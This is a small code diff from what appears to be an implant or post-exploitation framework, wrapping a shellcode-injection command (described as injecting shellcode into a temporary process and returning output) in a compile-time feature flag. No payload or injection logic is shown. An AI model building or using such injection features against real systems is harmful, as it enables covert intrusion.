@@ -10,6 +10,8 @@
 #include "BeaconCompatibility.h"
 #include "Tasks/InlineExecute.h"
 
+#ifdef INCLUDE_CMD_INJECT_SHELLCODE
+
 /**
  * @brief Inject shellcode into temporary process and return output
  * 
@@ -92,3 +94,5 @@ END:
     Shellcode.buffer = NULL;
     if (data) PackageDestroy(data);
 }
+
+#endif // INCLUDE_CMD_INJECT_SHELLCODE
